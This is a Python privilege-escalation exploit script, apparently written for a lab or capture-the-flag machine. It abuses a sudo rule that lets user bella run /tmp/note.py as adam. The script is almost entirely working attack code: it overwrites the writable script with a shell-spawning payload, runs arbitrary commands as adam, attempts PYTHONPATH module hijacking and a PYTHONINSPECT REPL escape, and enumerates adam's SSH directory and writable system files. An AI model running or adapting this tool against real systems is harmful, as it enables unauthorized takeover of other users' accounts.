#!/usr/bin/env python3
"""
Privilege Escalation: bella -> adam
Sudo rule: bella ALL=(adam) /usr/bin/python3 /tmp/note.py

FOR AUTHORIZED SECURITY TESTING ONLY
"""

import os
import sys
import pwd
import shutil
import subprocess
import tempfile
import time
from pathlib import Path


# ---------- Config ----------
TARGET_USER   = "adam"
SUDO_BIN      = "/usr/bin/sudo"
PYTHON_BIN    = "/usr/bin/python3"
SCRIPT_PATH   = "/tmp/note.py"
BACKUP_PATH   = "/tmp/note.py.bak"
# ----------------------------


def color(txt, c):
    codes = {"r": "\033[91m", "g": "\033[92m", "y": "\033[93m",
             "b": "\033[94m", "c": "\033[96m", "x": "\033[0m"}
    return f"{codes.get(c,'')}{txt}{codes['x']}"


def info(msg):  print(color(f"[*] {msg}", "b"))
def ok(msg):    print(color(f"[+] {msg}", "g"))
def warn(msg):  print(color(f"[!] {msg}", "y"))
def fail(msg):  print(color(f"[-] {msg}", "r"))
def hit(msg):   print(color(f"[★] {msg}", "c"))


def whoami():
    return pwd.getpwuid(os.getuid()).pw_name


def check_environment():
    """Make sure we're bella, and the sudo rule exists."""
    info("Checking environment...")

    user = whoami()
    if user != "bella":
        warn(f"Current user is '{user}', not 'bella'. Script may still work.")

    if not os.path.exists(SUDO_BIN):
        fail(f"{SUDO_BIN} not found")
        return False

    if not os.path.exists(PYTHON_BIN):
        fail(f"{PYTHON_BIN} not found")
        return False

    # Check sudo -l shows the target rule
    try:
        r = subprocess.run([SUDO_BIN, "-n", "-l"],
                           capture_output=True, text=True, timeout=5)
        combined = (r.stdout or "") + (r.stderr or "")
        if TARGET_USER in combined and "note.py" in combined:
            ok(f"Confirmed sudo rule: ({TARGET_USER}) python3 {SCRIPT_PATH}")
        else:
            warn("Could not confirm sudo rule via sudo -l (may need password).")
    except Exception as e:
        warn(f"sudo -l check failed: {e}")

    if not os.path.exists(SCRIPT_PATH):
        warn(f"{SCRIPT_PATH} does not exist yet — will create it.")
    return True


def get_target_ids():
    """Get UID/GID of target user."""
    try:
        pw = pwd.getpwnam(TARGET_USER)
        return pw.pw_uid, pw.pw_gid
    except KeyError:
        fail(f"User '{TARGET_USER}' does not exist on this system.")
        return None, None


def is_writable(path):
    """File exists and current user can write to it."""
    if not os.path.exists(path):
        # Check parent dir writability
        parent = os.path.dirname(path) or "/"
        return os.access(parent, os.W_OK)
    return os.access(path, os.W_OK)


# ============================================================
#  EXPLOIT PATH A — overwrite writable /tmp/note.py
# ============================================================
def exploit_writable_script(uid, gid):
    info("Attempting PATH A: overwrite writable /tmp/note.py")

    if not is_writable(SCRIPT_PATH):
        fail("/tmp/note.py is NOT writable and cannot be created.")
        return False

    # Backup original if it exists
    if os.path.exists(SCRIPT_PATH):
        try:
            shutil.copy2(SCRIPT_PATH, BACKUP_PATH)
            ok(f"Backed up original to {BACKUP_PATH}")
        except Exception as e:
            warn(f"Backup failed: {e}")

    # Malicious payload — spawns shell as adam
    payload = f'''#!/usr/bin/env python3
import os, pty, sys
try:
    os.setgid({gid})
    os.setuid({uid})
except Exception as e:
    sys.stderr.write("setuid failed: %s\\n" % e)
# Spawn interactive shell as adam
pty.spawn("/bin/bash")
'''
    try:
        with open(SCRIPT_PATH, "w") as f:
            f.write(payload)
        os.chmod(SCRIPT_PATH, 0o755)
        ok(f"Wrote payload to {SCRIPT_PATH}")
    except Exception as e:
        fail(f"Failed to write payload: {e}")
        return False

    # Trigger via sudo
    info(f"Triggering: sudo -u {TARGET_USER} {PYTHON_BIN} {SCRIPT_PATH}")
    print(color("-" * 60, "y"))
    try:
        subprocess.run([SUDO_BIN, "-u", TARGET_USER, PYTHON_BIN, SCRIPT_PATH])
    except KeyboardInterrupt:
        print()
        warn("Interrupted by user.")
    print(color("-" * 60, "y"))

    # Restore original
    if os.path.exists(BACKUP_PATH):
        try:
            shutil.copy2(BACKUP_PATH, SCRIPT_PATH)
            os.remove(BACKUP_PATH)
            ok("Restored original /tmp/note.py")
        except Exception as e:
            warn(f"Restore failed: {e}")

    return True


# ============================================================
#  EXPLOIT PATH B — non-interactive command as adam
# ============================================================
def exploit_run_command(uid, gid, command):
    """Overwrite script with a payload that runs one command as adam."""
    info(f"Running command as {TARGET_USER}: {command}")

    if not is_writable(SCRIPT_PATH):
        fail("/tmp/note.py not writable.")
        return False

    if os.path.exists(SCRIPT_PATH) and not os.path.exists(BACKUP_PATH):
        try:
            shutil.copy2(SCRIPT_PATH, BACKUP_PATH)
        except Exception:
            pass

    # Escape for embedding in Python source
    escaped = command.replace("\\", "\\\\").replace('"', '\\"')

    payload = f'''import os, sys
os.setgid({gid})
os.setuid({uid})
os.system("{escaped}")
'''
    try:
        with open(SCRIPT_PATH, "w") as f:
            f.write(payload)
    except Exception as e:
        fail(f"Write failed: {e}")
        return False

    try:
        subprocess.run([SUDO_BIN, "-u", TARGET_USER, PYTHON_BIN, SCRIPT_PATH])
    except KeyboardInterrupt:
        pass

    if os.path.exists(BACKUP_PATH):
        try:
            shutil.copy2(BACKUP_PATH, SCRIPT_PATH)
            os.remove(BACKUP_PATH)
        except Exception:
            pass
    return True


# ============================================================
#  EXPLOIT PATH C — PYTHONPATH / module hijack
# ============================================================
def exploit_pythonpath(uid, gid):
    info("Attempting PATH C: PYTHONPATH hijack")

    if not os.path.exists(SCRIPT_PATH):
        fail("/tmp/note.py not found — cannot enumerate imports.")
        return False

    try:
        src = Path(SCRIPT_PATH).read_text(errors="ignore")
    except Exception as e:
        fail(f"Cannot read {SCRIPT_PATH}: {e}")
        return False

    # Extract import names (very rough)
    import re
    mods = set(re.findall(r'^\s*import\s+([a-zA-Z_][\w]*)', src, re.M))
    mods |= set(re.findall(r'^\s*from\s+([a-zA-Z_][\w]*)\s+import', src, re.M))

    stdlib = set(sys.stdlib_module_names) if hasattr(sys, "stdlib_module_names") else set()
    candidates = [m for m in mods if m not in stdlib and m not in ("os", "sys")]

    if not candidates:
        warn("No hijackable imports found (all stdlib).")
        return False

    hit(f"Hijackable imports: {candidates}")

    # Check env_keep for PYTHONPATH
    try:
        r = subprocess.run([SUDO_BIN, "-l"], capture_output=True, text=True, timeout=5)
        if "PYTHONPATH" not in r.stdout:
            warn("PYTHONPATH is not preserved by sudoers — hijack unlikely to work.")
    except Exception:
        pass

    hijack_dir = tempfile.mkdtemp(prefix="hijack_", dir="/tmp")
    ok(f"Created hijack dir: {hijack_dir}")

    target_mod = candidates[0]
    payload = f'''import os, pty
os.setgid({gid})
os.setuid({uid})
pty.spawn("/bin/bash")
'''
    with open(os.path.join(hijack_dir, f"{target_mod}.py"), "w") as f:
        f.write(payload)
    ok(f"Placed malicious {target_mod}.py")

    info("Triggering with PYTHONPATH override...")
    env = os.environ.copy()
    env["PYTHONPATH"] = hijack_dir
    try:
        subprocess.run([SUDO_BIN, "-u", TARGET_USER, PYTHON_BIN, SCRIPT_PATH],
                       env=env)
    except KeyboardInterrupt:
        pass

    # cleanup
    try:
        shutil.rmtree(hijack_dir, ignore_errors=True)
    except Exception:
        pass
    return True


# ============================================================
#  EXPLOIT PATH D — PYTHONINSPECT (if env_keep)
# ============================================================
def exploit_pythoninspect():
    info("Attempting PATH D: PYTHONINSPECT fallback shell")
    warn("This drops you into a REPL as adam AFTER note.py finishes.")
    warn("Type: import os; os.system('/bin/bash')  to get a shell.")

    env = os.environ.copy()
    env["PYTHONINSPECT"] = "1"

    try:
        subprocess.run([SUDO_BIN, "-u", TARGET_USER, PYTHON_BIN, SCRIPT_PATH],
                       env=env)
    except KeyboardInterrupt:
        pass
    return True


# ============================================================
#  POST-EXPLOITATION enumeration
# ============================================================
def post_enum_as_adam(uid, gid):
    """Run a batch of enumeration commands as adam in one shot."""
    info(f"Running post-exploitation enumeration as {TARGET_USER}")

    commands = [
        "id",
        "echo '--- sudo -l ---'; sudo -n -l 2>&1 | head -40",
        "echo '--- home ---'; ls -la ~ 2>&1",
        "echo '--- .ssh ---'; ls -la ~/.ssh 2>&1",
        "echo '--- groups ---'; groups 2>&1",
        "echo '--- writable interesting ---'; find /etc /opt /usr/local -writable -type f 2>/dev/null | head -30",
    ]
    script = " && ".join(commands)
    exploit_run_command(uid, gid, script)


# ============================================================
#  MAIN
# ============================================================
def main():
    print("=" * 60)
    print(color(" bella -> adam Sudo Python Exploit", "c"))
    print(color(" Rule: bella ALL=(adam) /usr/bin/python3 /tmp/note.py", "x"))
    print("=" * 60)

    if not check_environment():
        sys.exit(1)

    uid, gid = get_target_ids()
    if uid is None:
        sys.exit(1)
    ok(f"Target {TARGET_USER}: uid={uid} gid={gid}")

    print()
    print("Select action:")
    print(f"  {color('1', 'g')}) Interactive shell as {TARGET_USER} (overwrite script)")
    print(f"  {color('2', 'g')}) Run a single command as {TARGET_USER}")
    print(f"  {color('3', 'g')}) Post-exploitation enumeration as {TARGET_USER}")
    print(f"  {color('4', 'g')}) PYTHONPATH hijack attempt")
    print(f"  {color('5', 'g')}) PYTHONINSPECT fallback REPL")
    print(f"  {color('0', 'g')}) Exit")
    choice = input("> ").strip()

    if choice == "1":
        exploit_writable_script(uid, gid)

    elif choice == "2":
        cmd = input("Command to run as adam: ").strip()
        if cmd:
            exploit_run_command(uid, gid, cmd)

    elif choice == "3":
        post_enum_as_adam(uid, gid)

    elif choice == "4":
        exploit_pythonpath(uid, gid)

    elif choice == "5":
        exploit_pythoninspect()

    else:
        print("Bye.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Aborted.")